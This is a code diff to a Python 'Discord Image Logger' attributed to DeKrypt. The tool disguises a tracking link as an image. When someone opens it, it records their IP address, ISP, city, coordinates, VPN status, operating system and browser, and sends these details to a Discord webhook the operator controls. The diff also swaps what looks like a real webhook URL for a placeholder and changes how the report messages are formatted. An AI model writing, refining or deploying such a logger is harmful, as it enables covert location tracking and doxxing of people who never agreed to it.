@@ -1,3 +1,6 @@
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
+
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -9,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334861934742208543/5uBPJITGopxMiC_QEyk-P3mpwNM46VJRV7fC0k-WTXISRJVaUmn_JWpNVPTTyWx10yjJ",
-    "image": "https://fileinfo.com/img/ss/xl/jpg_44-2.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -79,9 +82,7 @@ def reportError(error):
         {
             "title": "Image Logger - Error",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n
-\n{error}\n
-",
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -100,7 +101,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -147,28 +148,29 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
-**Endpoint:** {endpoint}
+**Endpoint:** `{endpoint}`
             
 **IP Info:**
-> **IP:** {ip if ip else 'Unknown'}
-> **Provider:** {info['isp'] if info['isp'] else 'Unknown'}
-> **ASN:** {info['as'] if info['as'] else 'Unknown'}
-> **Country:** {info['country'] if info['country'] else 'Unknown'}
-> **Region:** {info['regionName'] if info['regionName'] else 'Unknown'}
-> **City:** {info['city'] if info['city'] else 'Unknown'}
-> **Coords:** {str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** {info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})
-> **Mobile:** {info['mobile']}
-> **VPN:** {info['proxy']}
-> **Bot:** {info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}
+> **IP:** `{ip if ip else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
-> **OS:** {os}
-> **Browser:** {browser}
+> **OS:** `{os}`
+> **Browser:** `{browser}`
 
 **User Agent:**
+```
 {useragent}
-""",
+```""",
     }
   ],
 }
